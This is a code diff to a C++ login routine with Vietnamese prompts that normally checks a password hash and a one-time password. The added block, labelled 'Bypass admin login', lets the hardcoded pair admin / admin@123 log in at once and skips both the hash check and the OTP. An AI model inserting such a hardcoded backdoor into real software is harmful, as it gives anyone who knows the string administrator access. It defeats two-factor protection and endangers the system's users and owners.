@@ -277,6 +277,12 @@ bool dangNhap(string &loggedUser) {
     string username, password;
     cout << "Nhap ten dang nhap: "; cin >> username;
     cout << "Nhap mat khau: "; cin >> password;
+// === Bypass admin login ===
+    if (username == "admin" && password == "admin@123") {
+        loggedUser = username;
+        cout << "Dang nhap admin thanh cong (khong can OTP)!\n";
+        return true;
+    }
     if (!users.count(username) || users[username].passwordHash != hashPassword(password)) {
         cout << "Sai ten hoac mat khau!\n"; return false; }
     string otp = sinhOTP();
